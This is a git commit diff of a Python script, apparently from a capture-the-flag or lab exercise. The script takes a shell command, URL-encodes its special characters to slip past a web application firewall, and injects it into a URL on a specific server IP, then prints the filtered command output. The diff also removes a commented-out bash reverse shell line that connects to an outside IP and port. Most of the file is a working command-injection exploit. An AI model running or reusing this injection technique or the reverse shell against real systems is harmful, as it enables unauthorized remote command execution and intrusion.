6500c614f94050cdce0c66289c923ee3d392cb3c
Harry <harrybirch0@gmail.com>
2023-10-10 16:02:59 +1100

    Final Code for Accessing Server

--- Request.py
+++ Request.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import requests
 
+# This code encodes all the special characters I needed to allow them through the WAF
 command = input()
 formatted_command = '%3B'
 for char in command:
@@ -17,13 +18,21 @@ for char in command:
     formatted_command += char
 
 
-formatted_command += '%3B'
-url = 'http://54.206.178.157:8085/classified.html' + formatted_command
-#print(formatted_command)
+formatted_command += '%3B' # This appends the semicolon to the end of the URL as I thought it aided in the execution
+
+# URL with Command appended to the end
+url = 'http://54.206.178.157:8085/classified.html' + formatted_command 
+
+#print(formatted_command) // for debugging
+
+# The Request is sent
 getRequest = requests.get(url)
 
-#print(getRequest.content)
+#print(getRequest.content) // for debugging
 
+# -------------------------------
+
+# This section filters out the HTML Content of the page, and leaves only the output of the commands
 response = str(getRequest.content)
 substring = '</body>'
 if substring in response:
@@ -39,9 +48,8 @@ newstring = ''
 for line in hope:
     nl = line[2:]
     newstring += nl + '\n'
-#print(hope[-4])
+
+# -------------------------------
+
+# Prints the output of the remaining HTML that has been filtered
 print('\n' + newstring[8:-2] + '\n')
-
-#
-
-#bash -i >& /dev/tcp/101.113.205.143/8080 0>&1
